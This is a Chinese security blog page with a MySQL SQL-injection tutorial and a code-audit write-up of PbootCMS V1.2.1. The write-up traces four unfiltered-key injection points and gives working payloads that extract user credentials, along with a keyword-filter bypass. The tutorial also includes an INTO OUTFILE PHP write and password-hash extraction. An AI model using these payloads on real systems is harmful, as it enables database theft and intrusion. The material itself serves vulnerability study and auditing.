    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>##<strong>1.mysql中常见函数:</strong><br>在进行sql注入过程中,会使用到mysql的内置函数。在内置函数中又分为获取信息的<code>函数</code>和<code>功能函数</code></p>
<p><strong>信息函数:</strong>用来获取mysql中的数据库的信息<br>常见信息函数:</p>
<pre><code>user() ：当前使用者的用户名
database()：当前数据库名
version()：数据库版本
datadir：读取数据库的绝对路径
@@vasedir：mysql安装路径
@@version_compile_os：操作系统
concat()：连接一个或者多个字符串
group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据
</code></pre><p><strong>功能函数:</strong>传统的函数用来完成某项具体操作</p>
<p><code>load_file():</code>从计算机载入文件,读取文件中的数据</p>
<pre><code>select load_file(&apos;C:\\web\\1.txt&apos;);
select load_file(0x433A5C5C7765625C5C4D7953514C5C5C312E747874); //绕过单引限制,使用16进制转换C:\\web\\1.txt
</code></pre><p><code>into_file():</code>写入文件,前提是具有写入权限</p>
<pre><code>select &apos;&lt;?php phpinfo();?&gt;&apos; into outfile &apos;c:\\web\\MYSQL\\1.txt&apos;;              //单引号不能少
select char(60,63,112,104,112,32,112,104,112,105,110,102,111,40,41,59,32,63,62) into outfile &apos;c:\\web\\MYSQL\\1.txt&apos;;     //&lt;?php pphinfo();?&gt;换为Ascii码值
</code></pre><p><code>concat():</code>返回结果为连接参数产生的字符串。如果其中一个参数为null，则返回值为null<br><img src="http://static.zybuluo.com/chhyx/skhrfdjnmf9g3ya5fbbcfbi4/image_1cprho8cmm53btea97pf04ci9.png" alt="image_1cprho8cmm53btea97pf04ci9.png-10.8kB"></p>
<p><code>concat_ws():</code>concat()的简化版 第一个参数为分隔符,后面为字段名<br><img src="http://static.zybuluo.com/chhyx/ccoxga4lfnhjn797ujzoz9ll/image_1cpri8q272mmddgd4q2qv1qqam.png" alt="image_1cpri8q272mmddgd4q2qv1qqam.png-11.3kB"></p>
<p><code>group_concat():</code>用于合并多条查询记录的结果。</p>
<pre><code>select group_concat(name) from user;
//返回的是user表中所有的用户名且是作为一条记录返回
</code></pre><p><img src="http://static.zybuluo.com/chhyx/5m2jqjvwxa085t2dt5mj25qc/image_1cpriggt5di617sm19b2203s6913.png" alt="image_1cpriggt5di617sm19b2203s6913.png-22.4kB"></p>
<p><code>substr() substring()</code>用于截取字符串  用法:substr(str,pos,length) 注意:pos是从1开始的</p>
<pre><code>select substr((select database()),1,1); //t
select substr((select database()),2,1); //tp
select substr((select database()),1,2); //tp
</code></pre><p><code>ascii():</code>用法返回字符对应的ascii值    </p>
<pre><code>select ascii(&apos;a&apos;);#97
</code></pre><p><code>length():</code>返回字符串长度<br>    select length(concat(0x7e,(select user())));//hex(~)=0x7e</p>
<p><img src="http://static.zybuluo.com/chhyx/hchzczk6pqldgppm98mmurcs/image_1cprk9o9venb1ecm1kl81rdcoes1g.png" alt="image_1cprk9o9venb1ecm1kl81rdcoes1g.png-12.9kB"></p>
<p><code>if(exp1,exp2,exp2):</code>如果exp1的表达式是True,则返回exp2;否则返回exp3</p>
<p><img src="http://static.zybuluo.com/chhyx/50pwp3z3gx2kpqdrxc63fshv/image_1cprkigne3m885dn371ppv1c3s1t.png" alt="image_1cprkigne3m885dn371ppv1c3s1t.png-16.8kB"></p>
<p><code>hex():</code>返回字符串的16进制   <code>unhex():</code>反向的hex()的16进制<br><img src="http://static.zybuluo.com/chhyx/dwzzjdc8ecle6wy8xtuxftd9/image_1cprkmp0cqjtgkj1qjl584o1p19.png" alt="image_1cprkmp0cqjtgkj1qjl584o1p19.png-18.1kB"></p>
<p><strong>2.mysql数据库元信息</strong></p>
<blockquote>
<p><code>information_schema</code>数据库是在MYSQL的版本5.0之后产生的，一个虚拟数据库，物理上并不存在。<code>information_schema</code>数据库类似与“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名，列类型，访问权限（更加细化的访问方式）。<code>information_schema</code>是一个由数据库的元数据组成的数据库。里面存储的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称。并随时改变。用于查看信息以及系统决策时作为重要的信息提供者。</p>
</blockquote>
<p><code>information_schema</code>数据库下<code>schemata</code>表下<code>schema_name</code>字段 //存放数据库名<br><code>information_schema</code>数据库下<code>tables</code>表下<code>table_name</code>字段 //存放表名<br><code>information_schema</code>数据库下<code>columns</code>表下<code>column_name</code>字段 //存放字段名</p>
<pre><code>select database(); #查选数据库
select schema_name from information_schema.schemata;#得到databases名称
select table_name from information_schema.tables where TABLE_SCHEMA=&apos;tp&apos;;#得到tp数据库下的table名称
select column_name from information_schema.columns where  TABLE_NAME=&apos;user&apos; and TABLE_SCHEMA=&apos;tp&apos;;#得到user表中的字段
</code></pre><p>##<strong>3.窃取哈希口令:</strong><br>Mysql在<code>mysql.user</code>表中存储哈希口令,提取:<br><img src="http://static.zybuluo.com/chhyx/pk2vghr0nhggi7qlmmoeu35o/image_1cprg4r9s1ca71s8gr0i1p3rco39.png" alt="image_1cprg4r9s1ca71s8gr0i1p3rco39.png-22.5kB"></p>
<p>哈希口令是使用<code>PASSWORD()</code>函数加密的:<br><img src="http://static.zybuluo.com/chhyx/t1hyamh45szmoolqm5ioc279/image_1cprg65sgnfs1b141qai8o51aimm.png" alt="image_1cprg65sgnfs1b141qai8o51aimm.png-13.7kB"><br>关于哈希密码破解：<br><a href="https://www.cnblogs.com/ichunqiu/p/7810914.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/7810914.html</a></p>
<p>##<strong>4.常见SQL注入:</strong><br>按照执行效果来分类:</p>
<pre><code>**普通注入:**
联合查询注入：可以使用union的情况下的注入
基于报错注入：页面会返回错误信息,或者把注入的语句的结果直接返回页面

**盲注:**
基于布尔的盲注 即可以根据返回页面判断条件真假的注入
基于时间的盲注 即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

**特殊注入:**
二次注入  类似于存储xss 先将注入语句存入数据库 调用时触发
宽字节注入  
</code></pre><p><strong>A.联合查询注入</strong><br>先了解下<code>union</code>:<a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/12/mysql基础命令/</a><br><code>order by</code>用于对结果集进行排序<br>实例用的<code>sql</code>语句:</p>
<pre><code>order by 3  #正确
and 1=2 union select 1,version(),database() #爆版本和数据库名
and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata%23  #爆全部数据库名
</code></pre><p><strong>B.报错注入</strong><br>报错注入就是通过<code>sql</code>语句的矛盾性来使数据被回显到页面上</p>
<p><strong>C.盲注:</strong><br>基于布尔的<code>sql</code>盲注:</p>
<pre><code>1&apos; and ascii(substr(select database(),1,1))&gt;99
1&apos; and ascii(substr((select table_name from   information_schema.tables limit 0,1),1,1))&gt;90
</code></pre><p>基于时间的盲注:<br><code>sleep()</code>函数—-让此语句运行特定时间</p>
<pre><code>select * from users where id=1 and if(length(user())=14,sleep(3),1); //user()长度为14则等待3s
select * from users where id=1 and if(mid(user(),1,1)=&apos;r&apos;,sleep(3),1);//user()第一位为r 则等待3s
</code></pre><p><code>BENCHMARK()</code>函数—-测试某些特定操作的执行速度(不推荐使用)<br>    <img src="http://static.zybuluo.com/chhyx/vbb9oqe9cjg4leuaszajxzfj/image_1cprru9861pai13n1d1o1to1kl4m.png" alt="image_1cprru9861pai13n1d1o1to1kl4m.png-13.1kB"></p>
<p>实战中利用语句一般长这样:</p>
<pre><code>mysql&gt;  select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));
1 row in set (6.00 sec) //version()第一位为5
mysql&gt;  select sleep(find_in_set(mid(@@version, 2, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));
1 row in set (11.00 sec) //version()第一位为.
...  依次类推即可得到version()

select sleep(find_in_set(mid((select name from user where id=2), 1, 1), &apos;0,1,2,3,4,5,t,7,8,9,.&apos;)); //name值的第一位为t
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vbb9oqe9cjg4leuaszajxzfj/image_1cprru9861pai13n1d1o1to1kl4m.png" alt="image_1cprriluvei11khg1hojf3arlu9.png-30.9kB"></p>
<p><strong>D.特殊注入:</strong><br>二次注入:<br>注入过程分为两个部分,语句插入和语句执行。类似于存储型XSS,但是执行的地方与插入的地方可能不在一个位置。</p>
<p>宽字节注入:<br>关于宽字节注入,可以参考宽字节注入详解。宽字节输入一般是由于网页编码与数据库的编码不匹配造成的。对于宽字节注入,使用<code>%df</code>绕过</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/" itemprop="url">代码审计 | PbootCMS_V1.2.1详细审计SQL注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-15T08:15:41+08:00">
                2018-10-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>之前几周复现审计文章,但是轮到自己去挖掘的时候还是两眼黑,感谢P师傅的指点,成功学习了一波,记录下来,希望自己早日进阶代码审计。</p>
</blockquote>
<hr>
<blockquote>
<p>一.前期收集审计信息</p>
</blockquote>
<p><strong>1.部署CMS</strong><br><code>PbootCMS</code>部署是很方便的,直接下载下来即可使用,但是系统默认使用<code>sqlite</code>的,因为笔者用<code>mysql</code>用的比较多,那这里我就以<code>mysql</code>数据库安装来跑程序。在<code>config\database.php</code></p>
<p><img src="http://static.zybuluo.com/chhyx/tfjaax218vlz4iaj05vy8m28/image_1cpp8jqdc7mrhtd8mj1f311htf19.png" alt="image_1cpp8jqdc7mrhtd8mj1f311htf19.png-97.3kB"></p>
<p>然后自己创建数据库<code>pbootcms</code>,导入<code>static\backup\sql\20180720164810_pbootcms.sql</code>的sql语句并执行,看到下面内容就表明数据库部署成功<br><img src="http://static.zybuluo.com/chhyx/57n9bc88jdbb3dfi5kyxslqu/image_1cpp8o9a954m1t1rnrhatv82k1m.png" alt="image_1cpp8o9a954m1t1rnrhatv82k1m.png-30.7kB"><br>然后重新打开网站 看到如下内容表明<code>PbootCMS</code>部署成功<br><img src="http://static.zybuluo.com/chhyx/wow4n0eyjmgjmkmlcel2lmvp/image_1cpp8s3l61169stgg4m1p271m5j2j.png" alt="image_1cpp8s3l61169stgg4m1p271m5j2j.png-857.4kB"></p>
<p><strong>2.分析系统整体架构:</strong></p>
<pre><code>PbootCMS-V1.2.1
├─ apps         应用程序
│  ├─ admin     后台模块
│  ├─ api       api模块
│  ├─ common    公共模块
│  ├─ home      前台模块
├─ config       配置文件
│  ├─ config.php    配置文件
│  ├─ database.php  数据库配置文件
│  ├─ route.php     用户自定义路由规则
├─ core         框架核心
│  ├─ function  框架公共函数库
│  │  ├─ handle.php 助手函数库1
│  │  ├─ helper.php 助手函数库2
├─ template     html模板
├─ admin.php    管理端入口文件
├─ api.php      api入口文件
├─ index.php    前端入口文件
</code></pre><p>这里列出一些重要的目录,可快速了解系统,有3个入口文件(<code>admin.php,api.phpi,ndex.php</code>)分别对应<code>apps</code>目录下的几个模块(<code>admin,api,home</code>)</p>
<p><strong>3.确定路由走向</strong><br>经过初步测试,路由走向主要分为自定义路由跟普通MVC模式路由模式。<br>自定义路由:<br>查看路由文件 <code>apps\common\route.php</code><br><img src="http://static.zybuluo.com/chhyx/bk5dzuwptrot91ztl3ihidvu/image_1cpp986o17ian8je3v6hd17713d.png" alt="image_1cpp986o17ian8je3v6hd17713d.png-121kB"></p>
<p>举个例子:</p>
<pre><code>http://127.0.0.1/index.php/list/11
</code></pre><p>经过上面系统自定义路由解析后访问的是</p>
<pre><code>http://127.0.0.1/home/list/index/scode/11
</code></pre><p>定位:<code>home</code>模块<code>list</code>控制器<code>index</code>方法<code>scode</code>参数</p>
<p>普通MVC模式:<br>对于上面没有自定义的路由规则来说,直接按照MVC模式访问即可<br>例如:</p>
<pre><code>http://127.0.0.1:89/index.php/Message/add
</code></pre><p>定位:<code>apps\home\controller\MessageController.php</code>的<code>add()</code>方法</p>
<p><strong>4.系统参数过滤情况</strong><br>a.原生态的<code>GET,POST,REQUEST</code>过滤情况<br>找一处外部可访问的地方按如下方式测试即可:<br><img src="http://static.zybuluo.com/chhyx/j2gwd0qtkf9wezdhp9q7u4wz/image_1cplpaupq1u6m1sjvtrk157tksi9.png" alt="image_1cplpaupq1u6m1sjvtrk157tksi9.png-112.5kB"></p>
<p>根据浏览器输出我们可知原生态的获取数据方式是完全不过滤的</p>
<p>b.系统自带函数<code>get,post,request,cookie</code>过滤情况:</p>
<pre><code>#core\function\help.php
function get(
function post(
function request(
function cookie(
</code></pre><p>这里前3个函数都会调用<code>filter()</code>进行过滤,<code>filter()</code>会调用<code>escape_string()</code>函数,<code>Cookie</code>是直接进行<code>escape_string()</code>过滤</p>
<pre><code>#core\functionhandle.php
function escape_string($string, $dropStr = true)
{
    if (! $string)
        return $string;
    if (is_array($string)) { // 数组处理
        foreach ($string as $key =&gt; $value) {
            $string[$key] = escape_string($value);
        }
    } elseif (is_object($string)) { // 对象处理
        foreach ($string as $key =&gt; $value) {
            $string-&gt;$key = escape_string($value);
        }
    } else { // 字符串处理
        if ($dropStr) {
            $string = preg_replace(&apos;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&apos;, &apos;&apos;, $string);
        }
        $string = htmlspecialchars(trim($string), ENT_QUOTES, &apos;UTF-8&apos;);
        $string = addslashes($string);
    }
    return $string;
}
</code></pre><p>根据代码我们可以看到<br>0x1.首先这里经过了<code>preg_replace</code>正则匹配,对一些敏感词汇进行了过滤<br>0x2.<code>htmlspecialchars()</code>函数html实体编码(单双引号都过滤)<br>0x3.<code>addslashes()</code>函数转义</p>
<p>注意:<br>这里的过滤只针对<code>value</code>而<code>key</code>完全无过滤<br>正则绕过很简单,只需要<code>updateupdatexmlxml</code>即可绕过</p>
<p>因为这里绕过<code>html编码</code>与<code>addslashes()</code>函数而进行sql注入不现实<br>所以我们将重点放在key上面</p>
<p><strong>5.了解系统DB类,数据库底层的操作方法</strong><br>这里涉及代码太多,我们只需要对一些关键的地方进行了解即可</p>
<pre><code>#PbootCMS\core\basic\Model.php
</code></pre><p>通过读DB底层操作代码发现这里大部分都是字符串拼接,只要可以带入’或<code>即可注入。因为在value处注入不现实,现在我们把重点放在可控的数组上--&gt;寻找参数可为数组且用</code>key`直接拼接的操作方法</p>
<p>这里找到 <code>table()  name() field() where() order() insert() insertGetId() (调用的insert方法)  update()</code>等具有“漏洞”的操作</p>
<blockquote>
<p><strong>二.漏洞寻找及利用</strong></p>
</blockquote>
<p>这里咱们咱们重点关注前台sql注入<br>搜索方法:<br>  <strong>0x01.</strong>在<code>home\controller</code>中查找直接调用上述操作方法的函数—&gt;构建<code>sql</code><br>  <strong>0x02.</strong>在<code>home\model</code>查找调用上述操作方法的函数<code>a()</code>–&gt;返回<code>home\controller</code>中再次寻找调用<code>a()</code>函数的方法—&gt;构建<code>sql</code><br>  <strong>0x03.</strong>在公共函数库<code>apps\common</code>查找调用上述操作方法的函数<code>b()</code>–&gt;返回<code>home\controller</code>中寻找调用<code>b()</code>函数的方法—&gt;构建<code>sql</code></p>
<p>经过上面的前期审计分析,我们心中已经有了*数,接下来就是调试构造即可,这里就以实际挖掘的过程来讲解吧。</p>
<p>##<strong>1.Insert 注入一</strong><br><strong>代码分析:</strong><br>笔者本地测试关闭了验证码的验证,在实战中利用填写正确的验证码即可。<br>搜索<code>insert()</code>–&gt;在<code>home\model\ParserModel.php</code>找到<code>addMessage()</code>函数调用了<code>insert()</code>操作</p>
<pre><code>public function addMessage($data)
{
    return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
}
</code></pre><p>我们在搜索下<code>home\controller</code>哪里调用了<code>addMessage()</code>函数,在<code>MessageController.php</code>找到<code>add()</code>方法:</p>
<pre><code>public function add()
    {
        if ($_POST) {
        ...
        // 接收数据
        $mail_body = &apos;&apos;;
        foreach ($form as $value) {
            $field_data = post($value-&gt;name);
            if (is_array($field_data)) { // 如果是多选等情况时转换
                $field_data = implode(&apos;,&apos;, $field_data);
            }
            if ($value-&gt;required &amp;&amp; ! $field_data) {
                alert_back($value-&gt;description . &apos;不能为空！&apos;);
            } else {
                $data[$value-&gt;name] = post($value-&gt;name);
                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
            }
        }
        ...

        if ($this-&gt;model-&gt;addMessage($data)) {
            ...
        }
    }
</code></pre><p>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将POST提交的数组直接赋值给<code>$data</code>–&gt;进入<code>addmessage()---&gt;inert()</code> 造成注入。</p>
<p><strong>payload:</strong></p>
<pre><code>url: http://127.0.0.1:89/index.php/Message/add
POST: contacts[id`) values (1 and updatexml(1,concat(0x7e,user(),1),1)); -- a]=1&amp;content=1&amp;mobile=1
</code></pre><p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/ka58v3fqgjjbual6zb6mcq4c/image_1cpn0rgnj169h14k21ag1ulrksd9.png" alt="image_1cpn0rgnj169h14k21ag1ulrksd9.png-120.3kB"></p>
<p>##<strong>2.Insert 注入二</strong><br>注意:本地测试时,需要添加一条数据才能注入,真实环境下,如果开放这个通话功能时即可直接注入<br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>insert</code>操作的函数,发现函数<code>addForm()</code></p>
<pre><code>#home\Model\ParserModel.php  addForm()
public function addForm($table, $data)
{
    return parent::table($table)-&gt;insert($data);
}
</code></pre><p>我们在搜索下<code>home\controller</code>中调用<code>addForm()</code>函数的方法,在<code>FormController.php</code>找到<code>add()</code>方法:</p>
<pre><code>#home\controller\FormController.php add()
public function add()
{
    if ($_POST) {
        ...
    if ($fcode == 1) {
            alert_back(&apos;表单提交地址有误，留言提交请使用留言专用地址!&apos;);
        }
        ...
    if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {
        alert_back(&apos;接收表单不存在任何字段，请核对后重试！&apos;);
    }
    foreach ($form as $value) {
        $field_data = post($value-&gt;name);
        if (is_array($field_data)) { // 如果是多选等情况时转换
            $field_data = implode(&apos;,&apos;, $field_data);
            }
        if ($value-&gt;required &amp;&amp; ! $field_data) {
            alert_back($value-&gt;description . &apos;不能为空！&apos;);
        } else {
            $data[$value-&gt;name] = post($value-&gt;name);
            $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
            }
        }
        ...
    if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {
</code></pre><p>跟进<code>getFormField()</code>查看:</p>
<pre><code>    public function getFormField($fcode)
{   ...
    return parent::table(&apos;ay_form a&apos;)-&gt;field($field)
        -&gt;where(&quot;a.fcode=&apos;$fcode&apos;&quot;)
        -&gt;join($join)
        -&gt;order(&apos;b.sorting ASC,b.id ASC&apos;)
        -&gt;select();
}
</code></pre><p><code>fcode</code>为<code>ay_form</code>表的一个字段,只要<code>fcode</code>为2的字段存在即可注入<br>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将<code>POST</code>提交的数组直接赋值给<code>$data--&gt;addForm()---&gt;inert()</code> 造成注入。</p>
<p><strong>payload:</strong></p>
<pre><code>url: http://127.0.0.1:89/index.php/Form/add?fcode=2
POST: tel[id`) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]=12
</code></pre><p><strong>漏洞利用：</strong><br>要完成漏洞利用,需要在数据库中添加一个字段使得<code>fcode</code>为2<br>我们在后台新增一个表单:<br><img src="http://static.zybuluo.com/chhyx/2wru3avgsj3u0ykcqhjknf83/image_1cpo24s2d92r1gfl11rpq1vkj9.png" alt="image_1cpo24s2d92r1gfl11rpq1vkj9.png-62.4kB"></p>
<p>新增一个字段:<br><img src="http://static.zybuluo.com/chhyx/2dienx7ri5ej67imlqkos8s6/image_1cpo26dqd6r61d4l18vt1lj3190km.png" alt="image_1cpo26dqd6r61d4l18vt1lj3190km.png-66.3kB"><br><img src="http://static.zybuluo.com/chhyx/512i12ionncb6jg75lqax0b0/image_1cpo3bvr5f7j7cc2nd11vn1u92p.png" alt="image_1cpo3bvr5f7j7cc2nd11vn1u92p.png-226.7kB"></p>
<p>数据库:<br><img src="http://static.zybuluo.com/chhyx/xwhvuc5mi1kmtkf75xw92quv/image_1cppm94mf134u1t061qtg1rpg9rm9.png" alt="image_1cppm94mf134u1t061qtg1rpg9rm9.png-283.3kB"></p>
<p>注入:<br><img src="http://static.zybuluo.com/chhyx/397nmoityn6jgrqcufb2k6g2/image_1cpo3qdm010e7kr78vm1jl6e9o1j.png" alt="image_1cpo3qdm010e7kr78vm1jl6e9o1j.png-362.4kB"></p>
<p>##<strong>3.主页处注入</strong><br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>where</code>操作的函数<br>找到2处<code>getList</code>与<code>getSpecifyList</code>,两处的利用点都在<code>where</code>操作里:</p>
<pre><code>public function getList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
{
    ...
    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
        -&gt;where($where1, &apos;OR&apos;)
        -&gt;where($where2)    //触发点
        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
    ...
}
</code></pre><p>-</p>
<pre><code>public function getSpecifyList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
{
    ...
    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
        -&gt;where($where1, &apos;OR&apos;)
        -&gt;where($where2) //触发点
        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
        ...
}
</code></pre><p>B.我们再搜索下<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSpecifyListLabel()</code>方法:</p>
<pre><code>public function parserSpecifyListLabel($content)
{
    $pattern = &apos;/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/&apos;;
    $pattern2 = &apos;/\[list:([\w]+)(\s+[^]]+)?\]/&apos;;
    if (preg_match_all($pattern, $content, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i &lt; $count; $i ++) {
            // 获取调节参数
            $params = $this-&gt;parserParam($matches[1][$i]);
            ...
            // 数据筛选
            $where2 = array();
            foreach ($_GET as $key =&gt; $value) {//漏洞触发点
                if (substr($key, 0, 4) == &apos;ext_&apos;) { // 其他字段不加入
                    $where2[$key] = get($key); 
                }
            } 
            ...
            // 读取数据
            //5 4   date DESC,sorting ASC,id DESC  array(0)
            if ($page) {
                $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
            } else {
                $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);
            }
</code></pre><p>C.阅读代码先判断GET传输过来的<code>key</code>值前4位是否为<code>ext_</code>(扩展字段),如果是的话,直接赋值给<code>$where2</code>,然后进入读取数据操作,调用<code>getList</code>或<code>getSpecifyLis</code><br>触发注入。</p>
<p>D.我们追溯调用该<code>parserSpecifyListLabel()</code>函数的方法:<br> <code>parserSpecifyListLabel()---&gt;parserAfter()---&gt;index(IndexController.php)</code> 查看该index函数:</p>
<pre><code>public function index()
{
    $content = parent::parser(&apos;index.html&apos;); // 框架标签解析
    ...
    $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析   跟进这个方法
    $this-&gt;cache($content, true);
}
</code></pre><p>这里逻辑就很清楚了,利用系统解析list标签下的ext扩展字段来进行注入。<br>这里key值为任意扩展字段(<code>ext_price ext_type ext_color</code>)即可:<br><img src="http://static.zybuluo.com/chhyx/vi4grkematw263ehpl3t7cgx/image_1cpqr3p931934f811s0lfhspuk18.png" alt="image_1cpqr3p931934f811s0lfhspuk18.png-106.9kB"></p>
<p>漏洞涉及文件:</p>
<pre><code>IndexController.php的index()---&gt;parserAfter()---&gt;parserSpecifyListLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
</code></pre><p>直接拼接key造成注入</p>
<p><strong>漏洞利用:</strong><br>因为系统会将空格转化为_ 我们可用/**/来绕过。</p>
<pre><code>payload: http://127.0.0.1:89/index.php?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
</code></pre><p>因为updatexml的最大长度为32位,所以在查询password时会显示不全,我们在实战过程中可以单独读取password字段或者利用其他函数注入即可。这个之后文章讨论。</p>
<p>注入:<br><img src="http://static.zybuluo.com/chhyx/msmqe1h5bab7lemysg3zrb2l/image_1cpql0h0g1r4qia91d3l1oms6kq9.png" alt="image_1cpql0h0g1r4qia91d3l1oms6kq9.png-216.5kB"></p>
<p>##<strong>4.搜索处注入</strong><br>代码分析:<br>A.我们继续搜索<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSearchLabel()</code>方法。</p>
<pre><code>public function parserSearchLabel($content)
{
    $pattern = &apos;/\{pboot:search(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:search\}/&apos;;
    $pattern2 = &apos;/\[search:([\w]+)(\s+[^]]+)?\]/&apos;;
    ...
            // 存储搜索条件，条件为“并列”关系，由于为模糊匹配，条件为空时意味着“任意”
            $where2 = array();
    ...

            // 数据接收
            foreach ($_GET as $key =&gt; $value) {
                if (! ! $value = get($key, &apos;vars&apos;)) {
                    $where2[$key] = $value;//key 可控
                }
            }
    ...
            // 读取数据
            if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) {
            ...
</code></pre><p>这里代码逻辑:将<code>GET</code>传输过来的字段直接赋值给<code>where2</code>数组 接着进入<code>getList()</code>方法 造成注入</p>
<p>B.然后同上,搜索<code>home\controller</code>中调用<code>parserSearchLabel()</code>的方法,我们追溯调用该<code>parserSearchLabel()</code>函数的方法:<br> <code>parserSearchLabel()---&gt;index(SearchController.php)</code> 查看该index函数:</p>
<pre><code>public function index()
{
    $content = parent::parser(&apos;search.html&apos;); // 框架标签解析
    ...
    $content = $this-&gt;parser-&gt;parserSearchLabel($content); // 搜索结果标签    跟进这个地方
    ...
}
</code></pre><p>这里逻辑就很清楚了,利用系统解析<code>search</code>标签字段而对<code>get</code>传输进来的参数无有效过滤造成注入。</p>
<p>C.涉及文件:</p>
<pre><code>SearchController.php的index()---&gt;parserSearchLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
</code></pre><p><strong>漏洞利用:</strong></p>
<pre><code>payload: http://127.0.0.1:89/index.php/search?updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
</code></pre><p>注入:<br><img src="http://static.zybuluo.com/chhyx/lx86w77bhpkxenv0vipg9ry8/image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png" alt="image_1cpqthi64jkb1iae1q8u1n5i1oc1l.png-144.6kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/mysql基础命令/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/12/mysql基础命令/" itemprop="url">mysql基础命令</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T09:15:41+08:00">
                2018-10-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>mysql基础知识,持续更新。没事儿敲一敲命令。</p>
</blockquote>
<hr>
<p>mysql基础命令:</p>
